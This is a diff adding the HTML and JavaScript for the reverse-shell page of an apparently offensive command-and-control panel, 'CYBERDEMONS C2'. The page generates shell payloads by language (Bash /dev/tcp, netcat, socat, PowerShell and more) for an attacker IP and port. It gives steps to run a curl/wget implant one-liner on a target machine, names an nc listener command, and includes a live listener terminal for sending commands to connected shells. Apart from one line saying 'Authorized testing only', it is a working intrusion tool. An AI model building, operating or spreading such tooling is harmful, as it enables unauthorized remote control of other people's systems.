@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Reverse Shells — CYBERDEMONS C2</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;500;800&family=Orbitron:wght@400;900&display=swap" rel="stylesheet">
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+:root {
+  --neon-cyan: #00fff0;
+  --neon-magenta: #ff00ff;
+  --neon-green: #39ff14;
+  --neon-red: #ff0040;
+  --bg-dark: #0a0a0f;
+  --bg-panel: #0d0d1a;
+  --bg-card: #111122;
+  --border-color: #1a1a3a;
+  --text-dim: #6a6a8a;
+  --text-bright: #e0e0ff;
+}
+body {
+  font-family: 'JetBrains Mono', monospace;
+  background: var(--bg-dark);
+  color: var(--text-bright);
+  padding: 24px;
+  min-height: 100vh;
+}
+body::before {
+  content: '';
+  position: fixed; inset: 0;
+  background: linear-gradient(rgba(0,255,240,.03) 1px, transparent 1px),
+              linear-gradient(90deg, rgba(0,255,240,.03) 1px, transparent 1px);
+  background-size: 40px 40px;
+  pointer-events: none;
+  z-index: 0;
+}
+.container { max-width: 1400px; margin: 0 auto; position: relative; z-index: 1; }
+.header {
+  display: flex; justify-content: space-between; align-items: center;
+  margin-bottom: 24px; flex-wrap: wrap; gap: 12px;
+}
+.header h1 {
+  font-family: 'Orbitron', monospace;
+  font-size: 22px; font-weight: 900;
+  color: var(--neon-cyan);
+  text-shadow: 0 0 20px rgba(0,255,240,.3);
+  letter-spacing: 3px;
+}
+.header h1 span { color: var(--neon-magenta); }
+.header a {
+  color: var(--text-dim); text-decoration: none;
+  font-size: 12px; transition: color .2s;
+}
+.header a:hover { color: var(--neon-cyan); }
+.split { display: grid; grid-template-columns: 1fr 1.4fr; gap: 20px; }
+@media (max-width: 850px) { .split { grid-template-columns: 1fr; } }
+.card {
+  background: var(--bg-panel);
+  border: 1px solid var(--border-color);
+  border-radius: 8px; padding: 20px;
+}
+.card::before {
+  content: ''; position: absolute; top: -1px;
+  left: 20%; right: 20%; height: 1px;
+  background: linear-gradient(90deg, transparent, var(--neon-cyan), transparent);
+  opacity: .5;
+}
+.card-title {
+  font-family: 'Orbitron', monospace;
+  font-size: 11px; font-weight: 700;
+  color: var(--text-dim); text-transform: uppercase;
+  letter-spacing: 2px; margin-bottom: 16px;
+}
+.field { margin-bottom: 16px; }
+.label {
+  font-size: 10px; text-transform: uppercase;
+  letter-spacing: 1px; color: var(--text-dim);
+  display: block; margin-bottom: 6px;
+}
+.input, select {
+  width: 100%; background: rgba(0,0,0,.4);
+  border: 1px solid var(--border-color); border-radius: 4px;
+  padding: 10px 14px; color: var(--text-bright);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 13px; outline: none; transition: border-color .2s;
+}
+.input:focus, select:focus {
+  border-color: var(--neon-cyan);
+  box-shadow: 0 0 10px rgba(0,255,240,.1);
+}
+select { cursor: pointer; }
+select optgroup { background: #0d0d1a; color: var(--text-dim); }
+select option { background: #0d0d1a; color: var(--text-bright); }
+
+.btn {
+  padding: 10px 20px; border: 1px solid var(--border-color);
+  border-radius: 4px; cursor: pointer;
+  font-family: 'Orbitron', monospace; font-size: 11px;
+  text-transform: uppercase; letter-spacing: 1px;
+  transition: all .2s; background: transparent;
+  color: var(--text-bright);
+}
+.btn-primary { border-color: var(--neon-cyan); color: var(--neon-cyan); }
+.btn-primary:hover { background: rgba(0,255,240,.1); box-shadow: 0 0 15px rgba(0,255,240,.2); }
+.btn-green { border-color: var(--neon-green); color: var(--neon-green); }
+.btn-green:hover { background: rgba(57,255,20,.1); box-shadow: 0 0 15px rgba(57,255,20,.2); }
+
+.payload-card {
+  background: var(--bg-card);
+  border: 1px solid var(--border-color);
+  border-radius: 8px; overflow: hidden;
+}
+.payload-header {
+  padding: 12px 16px;
+  border-bottom: 1px solid var(--border-color);
+  display: flex; justify-content: space-between; align-items: center;
+  font-size: 11px; color: var(--text-dim);
+}
+.payload-header .lang-badge {
+  color: var(--neon-cyan); font-size: 11px;
+}
+.payload-header .copy-btn {
+  background: transparent; border: 1px solid var(--border-color);
+  padding: 4px 12px; border-radius: 4px; color: var(--text-bright);
+  font-size: 10px; cursor: pointer; transition: all .2s;
+  font-family: 'JetBrains Mono', monospace;
+}
+.payload-header .copy-btn:hover {
+  border-color: var(--neon-cyan); color: var(--neon-cyan);
+}
+pre {
+  margin: 0; padding: 16px;
+  background: rgba(0,0,0,.5);
+  color: var(--neon-green);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 13px; line-height: 1.5;
+  white-space: pre-wrap; word-break: break-all;
+  overflow-x: auto; max-height: 400px;
+}
+.info-bar {
+  margin-top: 12px; font-size: 11px;
+  display: flex; justify-content: space-between;
+  color: var(--text-dim);
+  border-top: 1px solid var(--border-color);
+  padding-top: 12px;
+}
+.warning {
+  background: rgba(255,0,64,.08);
+  border-left: 3px solid var(--neon-red);
+  padding: 10px 14px; margin-top: 12px;
+  font-size: 11px; border-radius: 4px; color: var(--text-dim);
+}
+.warning code { color: var(--neon-cyan); }
+
+/* C2 oneliner section */
+.oneliner-section {
+  margin-top: 20px;
+  border: 1px solid var(--neon-green);
+  border-radius: 8px;
+  background: rgba(57,255,20,.03);
+  padding: 20px;
+  position: relative;
+}
+.oneliner-section::before {
+  content: 'C2 IMPLANT'; position: absolute; top: -10px; left: 16px;
+  background: var(--bg-dark); padding: 0 8px;
+  font-family: 'Orbitron', monospace;
+  font-size: 10px; color: var(--neon-green);
+  letter-spacing: 2px;
+}
+.oneliner-section .desc {
+  font-size: 11px; color: var(--text-dim); margin-bottom: 12px; line-height: 1.5;
+}
+.oneliner-section .oneliner-output {
+  background: rgba(0,0,0,.6);
+  border: 1px solid var(--neon-green);
+  border-radius: 4px; padding: 14px; margin: 8px 0;
+  color: var(--neon-green); font-size: 12px;
+  word-break: break-all;
+}
+.oneliner-section .steps {
+  font-size: 11px; color: var(--text-dim); line-height: 1.8;
+  margin-top: 10px;
+}
+.oneliner-section .steps strong { color: var(--neon-green); }
+
+/* inline listener terminal */
+.listener-card {
+  margin-top: 20px;
+  border: 1px solid var(--border-color);
+  border-radius: 8px;
+  background: var(--bg-panel);
+  overflow: hidden;
+}
+.listener-card .l-header {
+  padding: 12px 16px;
+  border-bottom: 1px solid var(--border-color);
+  display: flex; align-items: center; gap: 12px; flex-wrap: wrap;
+  font-size: 11px;
+}
+.listener-card .l-header .l-status {
+  display: flex; align-items: center; gap: 6px; margin-right: auto;
+}
+.listener-card .l-header .l-dot {
+  width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0;
+}
+.listener-card .l-header .l-dot.idle { background: var(--text-dim); }
+.listener-card .l-header .l-dot.listening { background: var(--neon-yellow); animation: pulse 1s infinite; }
+.listener-card .l-header .l-dot.connected { background: var(--neon-green); box-shadow: 0 0 8px var(--neon-green); }
+.listener-card .l-header .l-dot.error { background: var(--neon-red); }
+.listener-card .l-header .l-input {
+  width: 70px; background: rgba(0,0,0,.4);
+  border: 1px solid var(--border-color); border-radius: 4px;
+  padding: 6px 10px; color: var(--text-bright);
+  font-family: 'JetBrains Mono', monospace; font-size: 11px; outline: none;
+}
+.listener-card .l-header .l-input:focus { border-color: var(--neon-cyan); }
+.listener-card .l-header .l-btn {
+  padding: 6px 14px; border-radius: 4px; border: 1px solid var(--border-color);
+  font-family: 'Orbitron', monospace; font-size: 10px; cursor: pointer;
+  text-transform: uppercase; letter-spacing: 1px;
+  transition: all .2s; background: transparent; color: var(--text-bright);
+}
+.listener-card .l-header .l-btn.start { border-color: var(--neon-green); color: var(--neon-green); }
+.listener-card .l-header .l-btn.start:hover { background: rgba(57,255,20,.1); }
+.listener-card .l-header .l-btn.stop { border-color: var(--neon-red); color: var(--neon-red); }
+.listener-card .l-header .l-btn.stop:hover { background: rgba(255,0,64,.1); }
+.listener-card .l-header .l-info { font-size: 10px; color: var(--text-dim); }
+.l-terminal {
+  background: rgba(0,0,0,.6);
+  height: 280px; overflow-y: auto; padding: 12px 16px;
+  font-family: 'JetBrains Mono', monospace; font-size: 12px; line-height: 1.6;
+}
+.l-terminal::-webkit-scrollbar { width: 4px; }
+.l-terminal::-webkit-scrollbar-thumb { background: var(--neon-magenta); border-radius: 2px; }
+.l-terminal .ln { white-space: pre-wrap; word-break: break-all; padding: 1px 0; }
+.l-terminal .ln.system { color: var(--neon-yellow); }
+.l-terminal .ln.output { color: var(--neon-green); }
+.l-terminal .ln.error { color: var(--neon-red); }
+.l-terminal .ln.input-line { color: var(--neon-cyan); }
+.l-terminal .ln.input-line::before { content: '> '; color: var(--neon-magenta); }
+.l-input-row {
+  display: flex; border-top: 1px solid var(--border-color);
+}
+.l-input-row input {
+  flex: 1; background: rgba(0,0,0,.4); border: none;
+  padding: 10px 16px; color: var(--text-bright);
+  font-family: 'JetBrains Mono', monospace; font-size: 12px; outline: none;
+}
+.l-input-row input:focus { background: rgba(0,0,0,.6); }
+.l-input-row button {
+  background: transparent; border: none; border-left: 1px solid var(--border-color);
+  padding: 10px 20px; color: var(--neon-cyan); cursor: pointer;
+  font-family: 'Orbitron', monospace; font-size: 10px;
+  text-transform: uppercase; letter-spacing: 1px; transition: all .2s;
+}
+.l-input-row button:hover { background: rgba(0,255,240,.1); }
+.l-input-row button:disabled { opacity: .3; cursor: not-allowed; }
+
+@keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: .3; } }
+
+::-webkit-scrollbar { width: 4px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: var(--neon-cyan); border-radius: 2px; }
+
+/* ─── MOBILE ─── */
+@media (max-width: 600px) {
+  body { padding: 12px; }
+  .container { max-width: 100%; }
+  .header h1 { font-size: 15px; letter-spacing: 1px; }
+  .header { gap: 8px; margin-bottom: 14px; }
+  .header a { font-size: 10px; }
+  .card { padding: 14px; border-radius: 6px; }
+  .card-title { font-size: 10px; margin-bottom: 12px; }
+  .field { margin-bottom: 12px; }
+  .input, select { padding: 10px 12px; font-size: 14px; }
+  .label { font-size: 9px; }
+  .btn { padding: 10px 14px; font-size: 10px; }
+  .warning { font-size: 10px; padding: 8px 10px; }
+  .payload-header { padding: 10px 12px; font-size: 10px; flex-wrap: wrap; gap: 6px; }
+  .payload-header .copy-btn { padding: 6px 10px; font-size: 9px; }
+  pre { padding: 12px; font-size: 11px; max-height: 220px; }
+  .info-bar { font-size: 9px; flex-direction: column; gap: 4px; }
+  .oneliner-section { padding: 14px; margin-top: 14px; }
+  .oneliner-section::before { font-size: 8px; left: 10px; top: -8px; padding: 0 6px; }
+  .oneliner-section .desc { font-size: 10px; }
+  .oneliner-section .oneliner-output { padding: 10px; font-size: 10px; word-break: break-all; }
+  .oneliner-section .steps { font-size: 10px; }
+  .oneliner-section .btn { margin-right: 4px !important; padding: 8px 10px; font-size: 9px; }
+  .listener-card { margin-top: 14px; }
+  .listener-card .l-header { padding: 10px 12px; gap: 8px; }
+  .listener-card .l-header .l-input { width: 60px; font-size: 12px; padding: 8px 8px; }
+  .listener-card .l-header .l-btn { padding: 8px 12px; font-size: 9px; }
+  .listener-card .l-header .l-info { font-size: 9px; width: 100%; }
+  .l-terminal { height: 200px; padding: 10px 12px; font-size: 11px; }
+  .l-input-row input { padding: 12px 12px; font-size: 14px; }
+  .l-input-row button { padding: 12px 14px; font-size: 9px; min-width: 60px; }
+}
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="header">
+    <h1>◈ REVERSE <span>SHELLS</span> ◈</h1>
+    <a href="/">&#8592; Back to C2</a>
+  </div>
+
+  <div class="split">
+    <div>
+      <div class="card">
+        <div class="card-title">Listener Config</div>
+        <div class="field">
+          <span class="label">Attacker IP / Host</span>
+          <input type="text" id="lhost" class="input" value="127.0.0.1" placeholder="IP or domain">
+        </div>
+        <div class="field">
+          <span class="label">Port</span>
+          <input type="number" id="lport" class="input" value="4444" placeholder="4444">
+        </div>
+        <div class="field">
+          <span class="label">Language</span>
+          <select id="langSelect">
+            <optgroup label="Linux / Unix">
+              <option value="bash_tcp">Bash /dev/tcp</option>
+              <option value="nc_traditional">Netcat (traditional -e)</option>
+              <option value="nc_mkfifo">Netcat (mkfifo, no -e)</option>
+              <option value="socat">Socat</option>
+              <option value="telnet">Telnet</option>
+              <option value="perl">Perl</option>
+              <option value="ruby">Ruby</option>
+              <option value="lua">Lua</option>
+              <option value="awk">AWK</option>
+            </optgroup>
+            <optgroup label="Scripting">
+              <option value="python3" selected>Python3</option>
+              <option value="python2">Python2</option>
+              <option value="php_exec">PHP (exec)</option>
+              <option value="php_system">PHP (system)</option>
+              <option value="nodejs">Node.js</option>
+              <option value="go">Go</option>
+            </optgroup>
+            <optgroup label="Windows">
+              <option value="powershell_plain">PowerShell</option>
+              <option value="csharp">C#</option>
+              <option value="ncat_ssl">Ncat with SSL</option>
+            </optgroup>
+            <optgroup label="Other">
+              <option value="java">Java</option>
+            </optgroup>
+          </select>
+        </div>
+        <div class="warning">
+          <strong style="color:var(--neon-cyan);">C2 Protocol</strong> → set port to your C2 listener (e.g. 7777)<br>
+          <strong style="color:var(--text-dim);">Standard shells</strong> → use <code>nc -lvnp &lt;PORT&gt;</code> as listener<br>
+          Authorized testing only.
+        </div>
+      </div>
+
+      <div class="oneliner-section">
+        <div class="desc">
+          Deploy the <strong style="color:var(--neon-green);">CYBERDEMONS C2 Linux implant</strong>
+          via a single curl/wget one-liner. No dependencies needed.
+        </div>
+        <div class="oneliner-output" id="onelinerDisplay">Click refresh to generate</div>
+        <button class="btn btn-green" onclick="refreshOneliner()" style="margin-right:8px;">&#8635; Refresh</button>
+        <button class="btn btn-green" onclick="copyOneliner()">&#128203; Copy</button>
+        <div class="steps">
+          <strong>1.</strong> Build the Linux payload in the <a href="/builder" style="color:var(--neon-cyan);">Builder</a> (select Linux/ELF)<br>
+          <strong>2.</strong> Run this one-liner on the target machine<br>
+          <strong>3.</strong> Implant connects back to C2 on port <span id="c2PortDisplay">7777</span>
+        </div>
+      </div>
+    </div>
+
+    <div>
+      <div class="payload-card">
+        <div class="payload-header">
+          <span><span class="lang-badge" id="currentLang">Python3</span></span>
+          <button class="copy-btn" id="copyBtn" onclick="copyPayload()">&#128203; Copy</button>
+        </div>
+        <pre id="payloadDisplay"># Select options and generate</pre>
+      </div>
+      <div class="info-bar">
+        <span id="sizeInfo">—</span>
+        <span id="timestamp"></span>
+      </div>
+
+      <!-- inline listener -->
+      <div class="listener-card">
+        <div class="l-header">
+          <div class="l-status">
+            <span class="l-dot idle" id="listenerDot"></span>
+            <span id="listenerStatus">Stopped</span>
+          </div>
+          <input type="number" id="listenerPort" class="l-input" value="4444" placeholder="port">
+          <button class="l-btn start" id="listenerToggle" onclick="toggleListener()">Start</button>
+          <span class="l-info" id="listenerInfo"></span>
+        </div>
+        <div class="l-terminal" id="listenerTerminal">
+          <div class="ln system">[idle] Click Start to listen</div>
+        </div>
+        <div class="l-input-row">
+          <input type="text" id="listenerInput" placeholder="type command..." disabled
+                 onkeydown="if(event.key==='Enter')sendListenerInput()">
+          <button id="listenerSendBtn" disabled onclick="sendListenerInput()">Send</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+const LHOST = document.getElementById('lhost');
+const LPORT = document.getElementById('lport');
+const LANG = document.getElementById('langSelect');
+const DISPLAY = document.getElementById('payloadDisplay');
+const CLABEL = document.getElementById('currentLang');
+const SIZE = document.getElementById('sizeInfo');
+const TS = document.getElementById('timestamp');
+const COPY = document.getElementById('copyBtn');
+const ONELINER = document.getElementById('onelinerDisplay');
+
+async function generate() {
+  const ip = LHOST.value.trim() || '127.0.0.1';
+  const port = parseInt(LPORT.value) || 4444;
+  const lang = LANG.value;
+  const r = await fetch(`/api/shells?ip=${ip}&port=${port}&lang=${lang}`);
+  const data = await r.json();
+  if (data.payload) {
+    DISPLAY.textContent = data.payload;
+    SIZE.textContent = `${data.payload.length} chars`;
+    TS.textContent = new Date().toLocaleTimeString();
+    CLABEL.textContent = LANG.options[LANG.selectedIndex].text;
+  }
+}
+
+async function refreshOneliner() {
+  const r = await fetch('/api/shells/oneliner');
+  const data = await r.json();
+  ONELINER.textContent = data.payload;
+  document.getElementById('c2PortDisplay').textContent = data.c2_port;
+}
+
+async function copyPayload() {
+  const t = DISPLAY.textContent;
+  if (!t || t.includes('Select options')) return;
+  await navigator.clipboard.writeText(t);
+  const orig = COPY.textContent;
+  COPY.textContent = '&#10003; Copied!';
+  setTimeout(() => COPY.textContent = orig, 1500);
+}
+
+async function copyOneliner() {
+  const t = ONELINER.textContent;
+  await navigator.clipboard.writeText(t);
+}
+
+LHOST.addEventListener('input', generate);
+LPORT.addEventListener('input', generate);
+LANG.addEventListener('change', generate);
+generate();
+refreshOneliner();
+
+// ---- inline listener ----
+let listenerRunning = false;
+let listenerPoll = null;
+let listenerOutCount = 0;
+
+const LTERM = document.getElementById('listenerTerminal');
+const LDOT = document.getElementById('listenerDot');
+const LSTATUS = document.getElementById('listenerStatus');
+const LINFO = document.getElementById('listenerInfo');
+const LTOGGLE = document.getElementById('listenerToggle');
+const LPORT_IN = document.getElementById('listenerPort');
+const LINPUT = document.getElementById('listenerInput');
+const LSEND = document.getElementById('listenerSendBtn');
+
+function listenerLog(type, text) {
+  const d = document.createElement('div');
+  d.className = 'ln ' + type;
+  d.textContent = text;
+  LTERM.appendChild(d);
+  LTERM.scrollTop = LTERM.scrollHeight;
+}
+
+async function toggleListener() {
+  if (listenerRunning) {
+    await stopListener();
+  } else {
+    await startListener();
+  }
+}
+
+async function startListener() {
+  const port = parseInt(LPORT_IN.value) || 4444;
+  const r = await fetch('/api/shell-listener/start', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({port})
+  });
+  const data = await r.json();
+  if (data.error) {
+    listenerLog('error', `[!] ${data.error}`);
+    return;
+  }
+  listenerRunning = true;
+  listenerOutCount = 0;
+  LTERM.innerHTML = '';
+  listenerLog('system', `[*] Listening on 0.0.0.0:${port}`);
+  LTOGGLE.textContent = 'Stop';
+  LTOGGLE.className = 'l-btn stop';
+  LDOT.className = 'l-dot listening';
+  LSTATUS.textContent = 'Listening';
+  LPORT_IN.disabled = true;
+  listenerLog('system', '[*] Waiting for connection...');
+  listenerPoll = setInterval(pollListener, 500);
+}
+
+async function stopListener() {
+  const port = parseInt(LPORT_IN.value) || 4444;
+  await fetch('/api/shell-listener/stop', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({port})
+  });
+  listenerRunning = false;
+  if (listenerPoll) { clearInterval(listenerPoll); listenerPoll = null; }
+  LTOGGLE.textContent = 'Start';
+  LTOGGLE.className = 'l-btn start';
+  LDOT.className = 'l-dot idle';
+  LSTATUS.textContent = 'Stopped';
+  LINFO.textContent = '';
+  LPORT_IN.disabled = false;
+  LINPUT.disabled = true;
+  LSEND.disabled = true;
+  listenerLog('system', '[*] Listener stopped');
+}
+
+async function pollListener() {
+  const port = parseInt(LPORT_IN.value) || 4444;
+  const r = await fetch(`/api/shell-listener/output?port=${port}&since=${listenerOutCount}`);
+  const data = await r.json();
+  if (data.error) return;
+
+  for (const item of data.output) {
+    if (item.type === 'output') {
+      listenerLog('output', item.data);
+    } else if (item.type === 'system') {
+      listenerLog('system', item.data);
+    } else if (item.type === 'error') {
+      listenerLog('error', item.data);
+    }
+  }
+  listenerOutCount = data.count;
+
+  if (data.connected) {
+    LDOT.className = 'l-dot connected';
+    LSTATUS.textContent = 'Connected';
+    LINPUT.disabled = false;
+    LSEND.disabled = false;
+    LINPUT.focus();
+  } else {
+    if (listenerRunning) {
+      LDOT.className = 'l-dot listening';
+      LSTATUS.textContent = 'Listening';
+    }
+    LINPUT.disabled = true;
+    LSEND.disabled = true;
+  }
+}
+
+async function sendListenerInput() {
+  const port = parseInt(LPORT_IN.value) || 4444;
+  const text = LINPUT.value.trim();
+  if (!text) return;
+  LINPUT.value = '';
+  listenerLog('input-line', text);
+  await fetch('/api/shell-listener/send', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({port, text})
+  });
+}
+</script>
+</body>
+</html>
